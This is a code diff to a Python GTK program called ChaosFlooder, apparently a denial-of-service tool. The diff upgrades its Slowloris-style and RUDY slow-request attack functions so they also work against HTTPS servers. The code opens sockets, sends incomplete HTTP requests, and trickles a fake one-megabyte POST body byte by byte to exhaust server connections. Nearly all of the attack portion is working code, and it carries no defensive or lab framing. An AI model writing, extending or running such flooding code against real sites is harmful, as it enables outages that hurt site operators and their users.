@@ -7,6 +7,7 @@ import random
 import string
 import requests
 import socket
+import ssl
 import signal
 from concurrent.futures import ThreadPoolExecutor
 
@@ -57,7 +58,6 @@ class ChaosFlooder(Gtk.Application):
         window.add(box)
         window.show_all()
 
-        # Trap Ctrl+C
         signal.signal(signal.SIGINT, self.sigint_handler)
 
     def sigint_handler(self, sig, frame):
@@ -193,7 +193,7 @@ class ChaosFlooder(Gtk.Application):
                     self._rudy(full_url)
                     self._bump("RUDY")
 
-                time.sleep(0.01)  # micro-throttle to prevent thread starvation
+                time.sleep(0.01)
 
             except Exception as e:
                 self.total_errors += 1
@@ -215,9 +215,15 @@ class ChaosFlooder(Gtk.Application):
         try:
             host = target_url.split("://")[1].split("/")[0]
             port = 443 if target_url.startswith("https://") else 80
+
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(5)
             sock.connect((host, port))
+
+            if port == 443:
+                context = ssl.create_default_context()
+                sock = context.wrap_socket(sock, server_hostname=host)
+
             sock.send(f"GET /?{self._rand_str(5)} HTTP/1.1\r\n".encode())
             sock.send(f"Host: {host}\r\n".encode())
             sock.send(b"User-Agent: chaos-bot\r\n")
@@ -232,13 +238,22 @@ class ChaosFlooder(Gtk.Application):
         try:
             host = target_url.split("://")[1].split("/")[0]
             port = 443 if target_url.startswith("https://") else 80
+
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
             sock.connect((host, port))
+
+            if port == 443:
+                context = ssl.create_default_context()
+                sock = context.wrap_socket(sock, server_hostname=host)
+
             payload = f"POST / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: chaos-rudy\r\nContent-Length: 1000000\r\n\r\n"
             sock.send(payload.encode())
+
             for _ in range(1000):
                 sock.send(b"A")
                 time.sleep(0.1)
+
             sock.close()
         except:
             pass
